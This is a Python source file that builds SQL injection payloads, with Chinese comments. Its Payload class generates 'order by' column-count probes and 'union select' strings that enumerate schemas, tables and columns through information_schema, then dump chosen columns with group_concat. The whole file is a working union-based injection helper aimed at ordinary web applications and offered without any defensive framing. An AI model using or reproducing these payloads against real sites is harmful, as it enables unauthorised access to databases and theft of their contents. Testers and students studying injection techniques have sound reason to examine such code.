#!/bin/env python3
class Payload():

    def __init__(self):
        pass

    def order_by(self, a):        #传入order by所需的列数
        a = str(a)
        return 'order by '+a+' --+'

    def order_list(self, b):      #传入回显列数中的随机数
        list1 = [str(i) for i in b]
        list2 = ','.join(list1)
        return 'and 1=2 union select '+list2+' --+'

    def union_sql(self, num1 = None,num2 = None,schema_name = None,table_name = None,column_name = []):
        if num1 == None or num2 == None:
            print("Error,please input num1 and num2.")
            return -1

        elif schema_name == None:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(schema_name) from information_schema.schemata')
                else:
                    list3.append(num1)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return 'and 1=2 union select '+list2+' --+'

        elif table_name == None:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(table_name) from information_schema.tables where table_schema = \'' +schema_name+'\'')
                else:
                    list3.append(num1)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return 'and 1=2 union select '+list2+' --+'

        elif len(column_name) == 0:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(column_name) from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+table_name+'\'')
                else:
                    list3.append(num1)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return 'and 1=2 union select '+list2+' --+' 

        else:
            list4 = [str(i) for i in column_name]
            list5 = ',0x20,'.join(list4)
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat('+list5+') from '+schema_name+'.'+table_name)
                else:
                    list3.append(num1)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return 'and 1=2 union select '+list2+' --+'



'''if __name__ == "__main__":
    b = [1,'aaa',3,'bbb']
    print(order_by(3))
    print(order_list(b))
    print(union_sql(None,1,'database','table',b))
    print(union_sql(2,1,None,'table',b))
    print(union_sql(2,1,'database',None,b))
    print(union_sql(2,1,'database','table',[]))
    print(union_sql(2,1,'database','table',b))'''
